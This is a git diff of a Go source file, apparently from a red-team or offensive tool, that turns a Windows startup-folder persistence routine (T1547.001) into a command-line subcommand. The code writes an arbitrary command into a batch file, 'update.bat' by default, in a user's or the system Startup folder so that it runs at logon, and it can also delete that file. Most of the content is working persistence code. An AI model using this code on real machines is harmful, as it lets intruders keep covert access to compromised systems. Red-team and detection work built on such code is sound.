@@ -5,30 +5,58 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"github.com/spf13/cobra"
 )
 
-// main startup folder persistence function, takes string arguments for the user to create persistence under, the command to be written to the batch file, 
-// the filename to be written, and the method to be used (add or remove)
-func StartupFolderPersist(user string, com string, filename string, method string){
-	fmt.Printf("[+] Checking %s's startup folder\n",user)
+var (
+	// arguments
+	user string
+	com string
+	filename string
+	method string
+	// cobra
+	startupfolderCmd = &cobra.Command{
+		Use: "startup",
+		Short: "Persistence using the startup folder for either a user or system (T1547.001)",
+		Run: startupfolderPersist,
+	}
+)
+
+func init(){
+	rootCmd.AddCommand(startupfolderCmd)
+	startupfolderCmd.Flags().StringVarP(&user, "user", "u", "", "Specify the user for startupfolder persistence, or specify SYSTEM for the system startup folder")
+	startupfolderCmd.Flags().StringVarP(&filename, "filename", "f", "update.bat", "Filename to be written")
+	startupfolderCmd.Flags().StringVarP(&method, "method", "m", "", "Add or remove the persistence technique (add will overwrite the file if it already exists) (required)")
+	startupfolderCmd.MarkFlagRequired("method")
+	startupfolderCmd.Flags().StringVarP(&com, "command", "c", "", "Command to execute for persistence (required with the add method)")
+	if method == "add"{
+		startupfolderCmd.MarkFlagRequired("command")
+	}
+}
+
+func startupfolderPersist(cmd *cobra.Command, args []string){
 	var homedir string
 	// gets the current user's home directory if a user isn't specified
-	if user == "Current User"{
+	if user == ""{
+		fmt.Println("[+] Checking the current users's startup folder")
 		tempdir,err := os.UserHomeDir()
 		if err != nil {
 			log.Fatalln(err)
 		}
 		homedir = tempdir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+		user = "the current user"
 	// if system is specified, use the system startup folder
 	} else if user == "SYSTEM" {
+		fmt.Println("[+] Checking the system's startup folder")
 		homedir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 	// else, grab the specified users startup folder
 	} else {
+		fmt.Printf("[+] Checking %s's startup folder\n",user)
 		homedir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 	}
 
 	// attempts to read the directory to ensure that it exists
-	files,err := ioutil.ReadDir(homedir)
+	files, err := ioutil.ReadDir(homedir)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -41,12 +69,12 @@ func StartupFolderPersist(user string, com string, filename string, method strin
 
 	// attempts to write the file under the startup folder for persistence
 	if method == "add"{
-		fmt.Printf("[+] Writing the %s file under %s's startup folder\n",filename,user)
+		fmt.Printf("[+] Writing the %s file under %s's startup folder\n", filename, user)
 		err = ioutil.WriteFile(homedir + "\\" + filename, []byte(com), 0755)
 		if err != nil {
 			log.Fatalln(err)
 		}
-		fmt.Printf("[+] Successfully wrote %s\n",filename)
+		fmt.Printf("[+] Successfully wrote %s\n", filename)
 
 	// attempts to delete the file if remove is provided
 	} else if method == "remove"{
@@ -55,10 +83,6 @@ func StartupFolderPersist(user string, com string, filename string, method strin
 		if err != nil {
 			log.Fatalln(err)
 		}
-		fmt.Printf("[+] Successfully removed the %s file\n",filename)
-		
-	} else {
-		fmt.Printf("[!] %s is not a valid method for the startupfolder persistence technique\n",method)
-		return
+		fmt.Printf("[+] Successfully removed the %s file\n", filename)	
 	}
 }
